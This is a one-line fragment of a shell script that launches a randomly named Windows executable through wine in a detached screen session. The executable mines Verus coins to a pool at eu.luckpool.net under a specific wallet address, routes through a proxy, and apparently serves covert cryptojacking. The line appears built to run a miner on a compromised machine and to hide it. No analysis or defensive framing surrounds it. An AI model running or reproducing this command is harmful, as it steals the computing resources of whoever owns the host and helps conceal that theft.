...
screen -d -m bash -c "wine $random_name.exe -a verus -o tratum+tcp://eu.luckpool.net:3960 -u RV66gw7B2BsfrFeUZ65wVgxzDxRvuSqJnw.belotloh -p d=5 -t 4 --proxy=$proxy_url"
